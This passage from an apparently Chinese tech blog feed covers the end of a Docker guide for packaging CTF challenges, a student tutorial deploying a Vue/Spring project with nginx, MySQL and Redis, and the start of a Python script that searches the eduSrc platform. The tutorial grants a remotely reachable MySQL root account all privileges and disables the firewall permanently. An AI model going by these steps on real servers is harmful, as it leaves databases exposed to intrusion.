flat"><p>容器的启动可以根据已有的镜像，如果定义了<code>image</code>这个标签，就会从本地搜寻相关镜像构建容器，如果本地找不到相关的镜像，就会从网上数据库搜寻相关的镜像。</p><p>但大家可能会产生疑问了，这里我们定义了<code>build</code>还有<code>image</code>两个不同的标签来构建镜像，那么容器到底要用<code>build</code>还是<code>image</code>来构建呢，这种情况下将按照<code>dockerfile</code>的方式来构建镜像，并且把镜像的名称定义为<code>image</code>标签里面的名称。</p></div><ul><li>environment<br>构建了相关的环境变量，在这里我们是定义了一个<code>FLAG</code>环境变量，并且值为<code>flag&#123;this_is_test_flag&#125;</code><br>定义之前要删除<code>shell文件</code>中的定义变量，否则会报错</li><li>ports<br>定义了映射的端口，<code>5555:80</code>表示映射到本机的<code>5555</code>端口，后面的<code>80</code>端口则要与Dockerfile文件中<code>EXPOSE</code>的端口保持一致。</li></ul><p>编写完成，直接运行下面第一条compose命令<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up  -d   # 创建并启动所有服务（常用）</span><br><span class="line">docker-compose build    # 容器镜像创建(没启动)</span><br><span class="line">docker-compose stop     # 关闭所有服务</span><br></pre></td></tr></table></figure><br>此时访问主机的5555端口，即<code>http://your-ip:5555</code>，即可看到题目👇<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220404/浏览器题目查看.6t8w0yxpc140.jpg" alt="浏览器题目查看"><br>查看一下是否实现本地动态flag👇<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220404/获取动态flag.4a83tfhoi9q0.jpg" alt="获取动态flag"></p><h2 id="六、好用的出题镜像"><a href="#六、好用的出题镜像" class="headerlink" title="六、好用的出题镜像"></a>六、好用的出题镜像</h2><p>从上面的过程中，我们看到对于一道题目来说，除了源码以外，最大的不方便之处就是还要有相关的一些文件配置。<br>在这里我推荐<code>virink</code>写的<a href="https://github.com/CTFTraining/base_image_nginx_mysql_php_56">base_image_nginx_mysql_php_56</a>来辅助我们快速出题。<br>这个镜像主要好在不需要我们去配置其他的<code>nginx</code>设置，而且还支持自动导入<code>db.sql</code>文件,支持自动执行<code>flag.sh</code>文件。</p><p>这里以一道题为例，题目中主要是需要配置数据库.<br>我们只需要<code>src文件夹</code>中放入<code>源码</code>、<code>flag.sh</code>、<code>db.sql</code>(<strong>文件名不能变</strong>)，现在我们dockerfile只需要这么写:<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctftraining/base_image_nginx_mysql_php_56</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> src /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mv /var/www/html/flag.sh / \</span></span><br><span class="line"><span class="bash">    &amp;&amp; chmod +x /flag.sh</span></span><br></pre></td></tr></table></figure><br>这个镜像就会自动为我们配置相关的<code>nginx</code>文件，同时自动导入要执行的<code>db.sql</code>文件来配置数据库(默认用户为root,密码也为root,执行后db.sql会被删掉)<br>同时镜像还会自动执行<code>flash.sh</code>来从环境变量中读取flag写入到<code>flag.php</code>中(需要注意的是，<strong>flag.sh必需在根目录下</strong>，也就是我们需要执行<code>mv /var/www/html/flag.sh /</code>这一步的原因所在)。<br>可以看到，这个镜像极大的方便了我们对Dockerfile的编写，把Dockerfile简化到只需要两三句话就能搞定。</p><p>如果是要在<code>php7</code>的环境下出题,可以采用<a href="https://github.com/CTFTraining/base_image_nginx_mysql_php_73">base_image_nginx_mysql_php_73</a></p><p>更多<code>docker模板</code>可前往链接 👉 <a href="https://github.com/DASCTF-Test">https://github.com/DASCTF-Test</a> 👈 ，这个docker模板中囊括了很多比赛题目需要的环境，web方面拥有多个版本php mysql的环境，拥有java与python等题目环境，pwn也拥有多个版本的操作系统与题目环境。</p><p>如果还想通过更多的环境学习如何出题，可以在这个 👉 <a href="https://github.com/CTFTraining/CTFTraining">项目</a> 👈 中查看更多的题目。</p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> Docker </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地部署前后端项目教程</title>
      <link href="/posts/ae96b769/"/>
      <url>/posts/ae96b769/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note info no-icon flat"><p>本地部署前后端项目，课程作业要求，记一下笔记，怕自己忘了<br>顺便给其他同学一个思路吧~ 有任何错误、疑问都可以提一下！</p></div><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>由于部署的是前后端项目，有三种方式：</p><ol><li><p>前后端一起部署 </p><p>打包前端代码生成<code>dist</code>文件夹，将dist文件夹中的复制到后端的<code>static</code>中，然后打包后端生成<code>jar</code>包，直接运行即可（无需安装nginx） </p><p> 简单，但不易修改，不提倡（自己也没试成功嘻嘻）</p></li><li><p>前后端分离部署 </p><p>前端后端分别打包，分别运行，前端是通过<code>nginx</code>代理的，后端启动<code>jar</code>包，前端的请求使用nginx代理发送到后端。</p></li><li><p>宝塔面板部署</p><p>适用于新手搭建，之前用过还挺快，就不知道老师那边过不过关（doge）</p><p> 教程：</p><ul><li><a href="https://baijiahao.baidu.com/s?id=1666393487336913288&amp;wfr=spider&amp;for=pc">干货速码！初学者如何建立网站-搭建宝塔Linux后台面板</a></li><li><a href="https://blog.csdn.net/qq_48922459/article/details/121901441">记Linux使用宝塔部署Vue+Springboot前后端分离项目</a></li></ul></li></ol><p>以下是第二种方法的步骤👇</p><h2 id="实验设备及需求"><a href="#实验设备及需求" class="headerlink" title="实验设备及需求"></a>实验设备及需求</h2><ul><li><p>前后端项目一份（前端<code>Vue</code>、后端<code>Spring</code>）</p></li><li><p>VM虚拟机</p><ul><li><code>Ubuntu</code>一台（用于存放前后端，及运行环境）</li><li><code>Centos7</code>两台（用于放置数据库和Redis）</li></ul></li></ul><div class="note primary flat"><p>这里因人而异，我分开是为了方便操作，如果嫌麻烦的话，集成到一台中也是可以的。</p></div><h2 id="前端部署"><a href="#前端部署" class="headerlink" title="前端部署"></a>前端部署</h2><h3 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h3><p>参考文章：<a href="https://blog.csdn.net/qq_23832313/article/details/83578836">ubuntu安装nginx</a></p><h4 id="启动nginx"><a href="#启动nginx" class="headerlink" title="启动nginx"></a>启动nginx</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/nginx/sbin    # 进入nginx启动目录</span><br><span class="line">./nginx                     # 启动nginx</span><br><span class="line">或者</span><br><span class="line">service nginx start</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//重启命令: 安装路径下</span><br><span class="line">sudo /usr/local/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure><h4 id="查看是否启动"><a href="#查看是否启动" class="headerlink" title="查看是否启动"></a>查看是否启动</h4><p>启动后浏览器访问自己的IP地址即可访问到下面的页面</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220315/浏览器访问.5l8wdcd6odw0.jpg" alt="浏览器访问"></p><p>或者终端输入命令，如图<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep nginx</span><br></pre></td></tr></table></figure></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220315/查看启动.79u2nnhhtb80.jpg" alt="查看nginx是否启动"></p><p>出现以上即为启动成功</p><div class="note default no-icon flat"><p>小笔记：ubuntu进入root权限，正常情况下不会设置root密码，要设置root密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root # 更换root密码</span><br></pre></td></tr></table></figure></div><h4 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./nginx -s stop</span><br><span class="line">或</span><br><span class="line">./nginx -s quit</span><br></pre></td></tr></table></figure><h3 id="打包前端"><a href="#打包前端" class="headerlink" title="打包前端"></a>打包前端</h3><p>把项目中的后端接口改成<code>Ubuntu</code>的ip<br>终端输入<code>ifconfig</code>查看ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build   # 打包前端生成dist文件夹</span><br></pre></td></tr></table></figure><p>生成dist文件夹（前端静态文件）</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220315/打包前端.3xo963pubvs0.jpg" alt="前端打包"></p><p>在Linux的目录下 mkdir 建一个放打包文件的文件夹（这里我用的是<code>/site/</code>）</p><h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><p>在<code>/usr/local/nginx/conf/nginx.conf</code>文件中添加代码，添加位置如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220315/配置nginx.32sdjef7tgk.jpg" alt="配置nginx"></p><p>代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">upstream javaboy.org&#123;</span><br><span class="line">        server 127.0.0.1:8090;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">location / &#123;</span><br><span class="line">                proxy_pass http://javaboy.org;</span><br><span class="line">                proxy_redirect default;</span><br><span class="line">        &#125;</span><br><span class="line">        location ~ .*\.(js|css|ico|png|jpg|eot|svg|ttf|woff|html) &#123;</span><br><span class="line">                #所有静态文件直接读取硬盘</span><br><span class="line">                root /site/dist/;</span><br><span class="line">                expires 30d; #缓存30天</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配置完后重启nginx即可。</p><p>浏览器访问<code>http://your-ip/index.html</code> 查看效果</p><div class="note info no-icon flat"><p>解释一下上面添加的代码<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upstream javaboy.org&#123;</span><br><span class="line">    server 127.0.0.1:8090;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个<code>javaboy.org</code>只是个名字，你随便怎么起都可以。<br>同理，下面的<code>proxy_pass http://javaboy.org</code>用的就是上面的这个。</p><p>也就是说，我们使用nginx的默认的80端口，访问这个接口的时候，nginx就会给把请求代理到后端的那个<code>8090</code>端口上。</p><p><strong>注意</strong>：这个<code>8090</code>是<code>后端</code>项目的端口!!!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location ~ .*\.(js|css|ico|png|jpg|eot|svg|ttf|woff|html) &#123;</span><br><span class="line">    #所有静态文件直接读取硬盘</span><br><span class="line">    root /site/dist/;</span><br><span class="line">    expires 30d; #缓存30天</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个就是说，以 <code>js|css|ico|png|jpg|eot|svg|ttf|woff|html</code> 这种结尾的页面，就不用请求后端，直接前端展示。</p><p>那下面的<code>root /site/dist/</code>，就是我上面说的我的前端打包成的 dist 在Linux的位置，这个要改成你自己的前端打包文件 dist 在Linux的<code>绝对路径</code>。</p><p>配置完成以后记得要<code>重新启动nginx</code>，配置文件才会<code>生效</code>。</p></div><h2 id="后端部署"><a href="#后端部署" class="headerlink" title="后端部署"></a>后端部署</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>修改项目中的<code>数据库IP</code> 为 <code>数据库服务器IP</code>, 其他不变</p><h3 id="打包后端项目"><a href="#打包后端项目" class="headerlink" title="打包后端项目"></a>打包后端项目</h3><p>点击IDEA右侧的<code>Maven</code> &gt; <code>package</code>，如图</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220315/打包后端1.1e6xg6xds3k0.jpg" alt="打包后端1"></p><p>在<code>target</code>文件夹中生成<code>jar</code>，我们需要的也正是这个<code>jar包</code></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220315/打包后端2.2t1o4trbg3y0.jpg" alt="打包后端2"></p><h3 id="运行后端"><a href="#运行后端" class="headerlink" title="运行后端"></a>运行后端</h3><p>将打包好的<code>jar包</code>放入上面建好的文件夹中</p><p>直接运行打包好的后端jar包，<code>运行日志</code>会显示出来，<code>ctrl+C</code>可关闭后端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar xxx.jar</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup java -jar xxx.jar &amp;</span><br></pre></td></tr></table></figure><p><code>nohup</code> 意思是不挂断运行命令,当账户退出或终端关闭时，程序仍然运行</p><p>当用 <code>nohup</code> 命令执行作业时，缺省情况下该作业的所有输出被重定向到nohup.out的文件中，除非另外指定了输出文件。</p><h2 id="数据库部署"><a href="#数据库部署" class="headerlink" title="数据库部署"></a>数据库部署</h2><h3 id="Centos7下载mysql8"><a href="#Centos7下载mysql8" class="headerlink" title="Centos7下载mysql8"></a>Centos7下载mysql8</h3><p>👉 <a href="https://www.cnblogs.com/secretmrj/p/15600144.html">Linux：CentOS7安装MySQL8【完整】</a>（推荐）👈</p><p>问题解决，参考以下文章：</p><ul><li><p><a href="https://blog.csdn.net/miaodichiyou/article/details/99289160">Failed to start mysqld.service: Unit not found</a></p></li><li><p><a href="https://blog.csdn.net/weixin_43404791/article/details/105174074">MySQL问题－Unit mysqld.service could not be found.</a></p></li><li><p><a href="https://blog.csdn.net/sunshine_hanxx/article/details/105959381">有效解决ERROR 2003 (HY000): Can’t connect to MySQL server on ‘localhost’ (111)</a></p></li></ul><h3 id="MySQL导出sql文件（Window下）"><a href="#MySQL导出sql文件（Window下）" class="headerlink" title="MySQL导出sql文件（Window下）"></a>MySQL导出sql文件（Window下）</h3><ol><li>终端导出 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名</span><br><span class="line">例：</span><br><span class="line">C:\&gt; mysqldump -u root -p dbname &gt; E:\mysql\mydb.sql</span><br></pre></td></tr></table></figure></li><li><p>Navicat导出</p><p> 选择自己要导出的<code>数据库</code> -&gt; 右键选择<code>转储SQL文件</code> -&gt; 选择<code>结构和数据</code></p></li></ol><h3 id="Mysql导入数据库（Linux下）"><a href="#Mysql导入数据库（Linux下）" class="headerlink" title="Mysql导入数据库（Linux下）"></a>Mysql导入数据库（Linux下）</h3><ol><li><p>首先进入<code>Mysql</code>中，创建空数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database dbname;</span><br></pre></td></tr></table></figure></li><li><p>导入</p><p>方法一：（须进入<code>Mysql</code>中）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use dbname;      # 选择数据库</span><br><span class="line">mysql&gt; set names utf8;              # 设置数据库编码</span><br><span class="line">mysql&gt; source /home/xxxx/dbname.sql;  # 导入数据（注意sql文件的路径）</span><br></pre></td></tr></table></figure><p>方法二：（无须进入<code>Mysql</code>中）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u用户名 -p密码 数据库名 &lt; 数据库名.sql</span><br></pre></td></tr></table></figure></li></ol><h3 id="允许Mysql远程登陆"><a href="#允许Mysql远程登陆" class="headerlink" title="允许Mysql远程登陆"></a>允许Mysql远程登陆</h3><p>如果是本机，进入mysql终端: <code>mysql -u [username] -p [password]</code></p><p>如果是远程主机，进入mysql终端: <code>mysql -h [host] -u [username] -p [password]</code></p><p>执行以下代码👇：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 进入数据库mysql</span></span><br><span class="line">mysql &gt; use mysql;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看当前用户</span>              </span><br><span class="line">mysql &gt; select User,Host from user;</span><br><span class="line"><span class="meta">  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建用户</span></span><br><span class="line">mysql &gt; CREATE user &#x27;root&#x27;@&#x27;%&#x27;;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置密码</span></span><br><span class="line">mysql &gt; ALTER USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;密码&#x27;; </span><br><span class="line"><span class="meta">#</span><span class="bash"> 授权用户所有权限</span></span><br><span class="line">mysql &gt; GRANT ALL PRIVILEGES ON *.* TO &quot;root&quot;@&quot;%&quot;;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 刷新权限列表</span></span><br><span class="line">mysql &gt; flush privileges;</span><br></pre></td></tr></table></figure></p><p>远程连接可能出现的问题👇</p><p><a href="https://blog.csdn.net/weixin_34358365/article/details/85953746">Ubuntu远程连接MySQL(connection refused)解决方法</a></p><h2 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h2><p>关闭防火墙是为了让服务器间能够互相访问</p><p>参考文章：<a href="https://blog.csdn.net/weixin_47872288/article/details/119641300">ubuntu:防火墙配置详细讲解（全）</a></p><p>可能会出现的错误，参考下面的方法 👇</p><p><a href="https://www.cnblogs.com/EasonJim/p/6851007.html">Ubuntu使用iptables配置防火墙提示：unrecognized service（Ubuntu配置iptables防火墙）</a></p><p>防火墙常用命令</p><ol><li><p>查看防火墙状态</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl status firewalld</span><br><span class="line">或</span><br><span class="line">service iptables status</span><br></pre></td></tr></table></figure><div class="note default flat"><p>绿色<code>active</code>为已开启，<code>loaded</code>为已关闭</p></div></li><li><p>暂时关闭防火墙</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">或</span><br><span class="line">service iptables stop</span><br></pre></td></tr></table></figure></li><li><p>永久关闭防火墙</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl disable firewalld</span><br><span class="line">或</span><br><span class="line">chkconfig iptables off</span><br></pre></td></tr></table></figure></li><li><p>重启防火墙</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable firewalld</span><br><span class="line">或</span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure></li><li><p>永久关闭后重启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//暂时还没有试过</span><br><span class="line">chkconfig iptables on</span><br></pre></td></tr></table></figure></li></ol><h2 id="Redis部署"><a href="#Redis部署" class="headerlink" title="Redis部署"></a>Redis部署</h2><p>查看之前的博客进行安装：<a href="https://www.zeker.top/posts/9d3a5b2a/">Centos 安装 Redis 及相关操作</a></p><p>Redis安装不是很难，我这里是部署到云服务器上的，如果没有用到Redis的可以直接跳过了</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>附上完成部署的图片<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220315/最终.1rvjlrmximhs.jpg" alt="完成部署"></p><div class="note warning flat"><p>时间有点紧，赶忙写出这篇文章，有什么问题会及时更新的，如果有什么不对的地方还望大佬们指点指点！</p></div>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring boot </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>针对eduSrc平台制作搜索脚本</title>
      <link href="/posts/7ee00516/"/>
      <url>/posts/7ee00516/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note default no-icon flat"><p>新年难得放松一些，闲来无事，想着好久没上edu漏洞平台看看了，看看有什么礼品上架，顺便想看看朋友怎么样，但奈何平台都没有搜索功能┭┮﹏┭┮，查起来也极不方便。</p><p>于是就挤了点时间随便写了下搜索脚本，写的不多，难度不大，但功能基本包含，写得不好的地方还请大佬们多多指教。</p></div><h1 id="脚本概述"><a href="#脚本概述" class="headerlink" title="脚本概述"></a>脚本概述</h1><p>本脚本主要是针对三个不同的搜索对象：<code>用户</code>，<code>礼品</code>以及<code>高校</code>。</p><p>信息处理上，利用<code>Xpath</code>和<code>正则表达式</code>对其进行一个对应信息的搜索获取，基本功能完整，提供<code>可视化搜索进度</code>。</p><p>菜单如下图👇<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220208/eduSrc_img1.2altqjz2w5wk.jpg" alt="脚本菜单"></p><p><code>main</code>函数如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">global</span> baseUrl, headers</span><br><span class="line">    <span class="keyword">global</span> numStart, expectedGiftNum</span><br><span class="line">    <span class="keyword">global</span> red, green, yellow, blue, end</span><br><span class="line">    red = <span class="string">&#x27;\033[1m\033[31m&#x27;</span></span><br><span class="line">    green = <span class="string">&#x27;\033[1m\033[32m&#x27;</span></span><br><span class="line">    yellow = <span class="string">&#x27;\033[1m\033[33m&#x27;</span></span><br><span class="line">    blue = <span class="string">&#x27;\033[1m\033[34m&#x27;</span></span><br><span class="line">    end = <span class="string">&quot;\033[0m&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;src.sjtu.edu.cn&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    searchFile = <span class="string">&#x27;search.txt&#x27;</span>               <span class="comment"># 查找用户名结果</span></span><br><span class="line">    giftFile = <span class="string">&#x27;gift.txt&#x27;</span>                   <span class="comment"># 查找礼品结果</span></span><br><span class="line">    baseUrl = <span class="string">&#x27;https://src.sjtu.edu.cn&#x27;</span>     <span class="comment"># 教育src网址</span></span><br><span class="line">    numStart = <span class="number">1</span>                            <span class="comment"># 用户列表起始页</span></span><br><span class="line">    expectedGiftNum = <span class="number">150</span>                   <span class="comment"># 预计有多少个礼品（可设）</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\neduSrc平台脚本（小型搜索脚本） —— by Ztop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\033[1m\033[35m------------功能描述---------------\n&#x27;</span></span><br><span class="line">              <span class="string">&#x27;1.根据用户名搜索用户信息（精确、模糊）\n&#x27;</span></span><br><span class="line">              <span class="string">&#x27;2.搜索平台未下架礼品\n&#x27;</span></span><br><span class="line">              <span class="string">&#x27;3.搜索指定区域内高校信息\n&#x27;</span></span><br><span class="line">              <span class="string">&#x27;-----------------------------------\033[0m&#x27;</span>)</span><br><span class="line">        choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;精确查找1 | 模糊查找2&#x27;</span>)</span><br><span class="line">            fchoice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> fchoice &gt; <span class="number">0</span> <span class="keyword">and</span> fchoice &lt; <span class="number">3</span>:</span><br><span class="line">                numEnd = get_numEnd(choice)  <span class="comment"># 获取用户列表End页</span></span><br><span class="line">                <span class="keyword">if</span> fchoice == <span class="number">1</span>:  <span class="comment"># 精确查找</span></span><br><span class="line">                    Exact_search(numEnd)</span><br><span class="line">                <span class="keyword">else</span>:  <span class="comment"># 模糊查找</span></span><br><span class="line">                    Fuzzy_search(searchFile, numEnd)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;%s未知选项！%s\n&quot;</span> % (yellow, end))</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">2</span>:  <span class="comment"># 未下架礼品搜索</span></span><br><span class="line">            gift_search(giftFile)</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">3</span>:  <span class="comment"># 省份高校的查找</span></span><br><span class="line">            collegeFind(choice)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s请重新输入%s\n&quot;</span> % (red, end))</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h1 id="针对用户"><a href="#针对用户" class="headerlink" title="针对用户"></a>针对用户</h1><p>根据用户名搜索用户信息，考虑到使用者对用户名可能的一些情况，特意区分了<code>精确查询</code>和<code>模糊查询</code>。</p><h2 id="精确查询"><a href="#精确查询" class="headerlink" title="精确查询"></a>精确查询</h2><p>遍历<code>Xpath</code>获取到的数据，可视化进度条，查询到即停止，并显示在控制台，<code>不会</code>继续搜索。</p><p>效果图如下👇（太菜了，师傅们轻点喷）<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220208/eduSrc_img2.3wlk3la5h0y0.jpg" alt="精确查询"></p><p>具体代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span 